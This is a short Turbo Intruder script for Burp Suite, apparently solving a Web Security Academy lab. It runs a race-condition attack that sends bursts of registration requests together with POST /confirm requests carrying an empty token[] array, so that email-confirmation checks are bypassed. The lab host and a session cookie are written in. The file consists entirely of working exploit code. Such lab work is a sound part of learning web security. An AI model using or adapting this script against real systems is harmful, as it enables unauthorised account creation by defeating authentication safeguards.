def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    token_req = '''POST /confirm?token[]= HTTP/2
Host: 0aa400630352a7a7804c44420040003a.web-security-academy.net
Cookie: phpsessionid=yPvtc5Q1o41RYihUGBETOIrqSeZLrLK2
Content-Length: 0

'''


    for i in range(20):
        username = "test" + str(i)        
        engine.queue(target.req, username, gate=str(i))
        
        for j in range(50):
            engine.queue(token_req, gate=str(i))
            
         
        engine.openGate(str(i))

def handleResponse(req, interesting):
    table.add(req)
